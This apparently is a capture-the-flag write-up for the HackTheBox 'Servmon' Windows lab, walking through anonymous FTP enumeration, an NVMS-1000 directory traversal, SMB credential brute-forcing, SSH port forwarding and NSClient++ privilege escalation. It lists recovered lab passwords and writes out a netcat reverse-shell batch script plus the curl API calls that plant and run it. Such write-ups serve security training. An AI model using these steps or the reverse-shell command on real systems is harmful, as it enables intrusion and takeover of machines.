---
title: Write-up Servmon Machine
author: pcw3r
date: 2020-06-20 17:00:00 +0800
categories: [HackTheBox, Boot2Root]
tags: [WINDOWS, EASY, ENUMERATION, WEB EXPLOITATION, DIRECTORY TRAVERSAL, SSH TUNNELING, CVE]
math: true
---

**<center>RefÂ°: HTB-09-Boot2Root</center>**

![Desktop View]({{ "/assets/img/servmon/HTB-Badge-Servmon.png" | relative_url }})

--- Servmon is a Windows machine that highlights an unsecured FTP server that will allow you to obtain important information about two users.

Using a traversal directory from NVMS-1000 will allow us to retrieve a txt file (result of informations found above) showing several passwords in clear text.

Privilege Escalation on NSClient++ allow to obtain root privilege from our compromise user.

![Desktop View]({{ "/assets/img/servmon/HTB-Information-Servmon.png" | relative_url }})

## **<span style='color:#c0392b'>[1] Discovery - Figure out environment</span>**
### Check all services
***
We find interesting services `ftp`, `web` on their usual ports and one custom port.

```terminal
$ nmap -A -T5 10.10.10.184 -p-
```

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-nmap.png" | relative_url }})

### FTP on port 21
***
Anonymous FTP login is allowed.

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-enumftp.png" | relative_url }})

This access on the FTP give us the possibility to check two user folders `Nadine` and `Nathan`.

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-enumftp1.png" | relative_url }})

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-enumftp2.png" | relative_url }})

Two notes are presents :

**Nadine note :**

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-note1.png" | relative_url }})

**Nathan note :**

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-note2.png" | relative_url }})


### Websites on port 80 and 8443
***

**Port 80 :** We have login page of `NVMS-1000` service.

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-nvms1000.png" | relative_url }})

`Directory Traversal` is possible on NVMS-1000. Reference : <https://www.exploit-db.com/exploits/48311>

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-searchsploit.png" | relative_url }})

**Port 8443 :** We have another service, named `NSClient++`. But the page seem to be break ...

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-nsclientbreak.png" | relative_url }})

`Privilege Escalation` is possible on NSClient++ 0.5.2.35 : <https://www.exploit-db.com/exploits/46802>

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-msfv.png" | relative_url }})

The Nadine note reference about a file named `Passwords.txt` present on the Desktop of Nathan user.
We use the first vulnerabilitie on NVMS-1000 to grab this file and gained the foothold.

## **<span style='color:#c0392b'>[2] Foothold - Get into the target </span>**
### Directory Traversal
***
Let's start metasploit to use the exploit module.

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-confdt.png" | relative_url }})

```terminal
$ msfconsole
msf5 > search nvms
msf5 > use auxiliary/scanner/http/tvt_nvms_traversal
msf5 auxiliary(scanner/smb/smb_login) > set RHOSTS 10.10.10.184
msf5 auxiliary(scanner/smb/smb_login) > set FILEPATH 'Users\Nathan\Desktop\Passwords.txt'
msf5 auxiliary(scanner/smb/smb_login) > exploit
```

We reveal much password in the file : `1nsp3ctTh3Way2Mars!`, `Th3r34r3To0M4nyTrait0r5!`, `B3WithM30r4ga1n5tMe`, `L1k3B1gBut7s@W0rk`, `0nly7h3y0unGWi11F0l10w`, `IfH3s4b0Utg0t0H1sH0me`,  `Gr4etN3w5w17hMySk1Pa5$`

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-dt.png" | relative_url }})

Let's see now if one of there match with Nadine or Nathan user.

```terminal
$ msfconsole
msf5 > search smb_login
msf5 > use auxiliary/scanner/smb/smb_login
msf5 auxiliary(scanner/smb/smb_login) > set USER_FILE .../Usernames.txt
msf5 auxiliary(scanner/smb/smb_login) > set PASS_FILE .../Passwords.txt
msf5 auxiliary(scanner/smb/smb_login) > set rhosts 10.10.10.184
msf5 auxiliary(scanner/smb/smb_login) > exploit
```

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-sshlogin.png" | relative_url }})

### Remote Service WinRM login
***
We get the flag to validate our foothold.

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-userflag.png" | relative_url }})


## **<span style='color:#c0392b'>[3] Privilege Escalation - Gain higher-level permissions</span>**
### NSClient++ 0.5.2.35 Exploitation
***
When NSClient++ is installed with Web Server enabled, local low privilege users have the ability to read the web administator's password in cleartext from the configuration file.
From here a user is able to login to the web server and make changes to the configuration file that is normally restricted.  


### Plaintext Password in configuration file
***

From configuration file `c:\program files\nsclient++\nsclient.ini` we obtained the password : `ew2x6SsGTxjRwXOT`

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-conf.png" | relative_url }})

But we also note that the administration page is accessible only in localhost. I tried to add my IP, but it requires a reboot.

And we're also having display problems accessing the service. We need to fix all that to operate properly.


#### Chromium :

To fix the display issue, i use Chromium and not firefox.

```terminal
$ chromium --no-sandbox --user-data-dir=~/.config/chromium
```

### SSH Local Forwarding
***
To bypass the localhost restriction, we use the local forwarding to forward a port from Servmon machine to my attacking machine.

Reference - ssh tunneling : <https://www.ssh.com/ssh/tunneling/example>

```terminal
$ ssh -l nadine 10.10.10.184 -L 1234:127.0.0.1:8443
```

We have now access on `https://127.0.0.1:1234` and the possibility to exploit Servmon machine.

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-sshforward.png" | relative_url }})

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-access.png" | relative_url }})


#### Check requirement modules :

Two modules are correctly enabled.

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-requirement1.png" | relative_url }})

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-requirement2.png" | relative_url }})

#### Put evil script and nc tool :

From `c:\temp` we add our script. NC tool is also in place.

```terminal
$ copy con servmon.bat
@echo off
c:\Temp\nc.exe 10.10.14.89 443 -e cmd.exe
```

#### Setup listener on attacking machine :


```terminal
$ sudo nc -lnvp 443
```


### Run Arbitrary command through API
***
All action with API. Web interface is so break ...

We add our script :

```terminal
$ curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/servmon.bat --data-binary "c:\Temp\nc.exe 10.10.14.89 443 -e cmd.exe"
$ curl -s -k -u admin https://localhost:8443/api/v1/scripts/ext/scripts/servmon.bat
```

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-addscript.png" | relative_url }})

And we launch the script :

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-executescript.png" | relative_url }})

### Flag root
***

We obtain root privilege :

![Desktop View]({{ "/assets/img/servmon/HTB-Images-Servmon-rootflag.png" | relative_url }})

***

## **<center>Trophy</center>**

> **Monitoring is not protection.**
>
> Myself
